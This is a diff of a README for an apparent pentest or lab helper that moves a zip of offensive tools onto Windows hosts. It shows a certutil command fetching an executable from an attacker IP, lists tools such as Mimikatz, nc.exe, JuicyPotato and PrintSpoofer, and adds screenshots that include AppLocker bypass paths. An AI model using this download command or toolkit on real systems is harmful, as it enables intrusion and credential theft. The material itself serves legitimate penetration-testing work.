@@ -27,7 +27,7 @@ I have more planned for future released such as building your zip files and gett
 
 **The manual way**
 
-We all know the manual way of dumping files onto Windows is quite laborious, such as:
+We all know the manual way of dumping files onto Windows is quite laborious, especially in older versions of Windows such as:
 ```
 certutil -urlcache -f http://10.10.14.12:8000/enum.exe c:\users\public\enum.exe
 ```
@@ -51,23 +51,23 @@ This is probably not advised on pentests as I'm sure AV will light up like a Chr
 First you will need to get all your common and favourite tools and scripts and add them to a zip file on your attack machine (you can add subfolders within your zip if you please).
 
 Personally here are some of the ones I have:
-accesschk.exe
-jaws.ps1
-nc.exe
-plink.exe
-PowerUp.ps1
-Seatbelt.exe
-SharpHound.exe
-SharpHound.ps1
-Sherlock.ps1
-Watson.exe
-winPEAS.bat
-winPEAS.exe
-JuicyPotato.exe
-PrintSpoofer.exe
-RunAsUser.exe
-Mimikatz.exe
-wget.exe
+- accesschk.exe
+- jaws.ps1
+- nc.exe
+- plink.exe
+- PowerUp.ps1
+- Seatbelt.exe
+- SharpHound.exe
+- SharpHound.ps1
+- Sherlock.ps1
+- Watson.exe
+- winPEAS.bat
+- winPEAS.exe
+- JuicyPotato.exe
+- PrintSpoofer.exe
+- RunAsUser.exe
+- Mimikatz.exe
+- wget.exe
 
 The choice is yours, add what you want.
 
@@ -96,7 +96,23 @@ Feel free to use the Release version or compile it yourself if you prefer.
 
 :-)
 
+**Screenshots**
 
+Help menu:
+
+![](/screenshots/help.png)
+
+Print AppLocker writable bypass locations:
+
+![](/screenshots/printpaths.png)
+
+Executing the tool:
+
+![](/screenshots/running.png)
+
+Showing the output:
+
+![](/screenshots/dir.png)
 
 
 
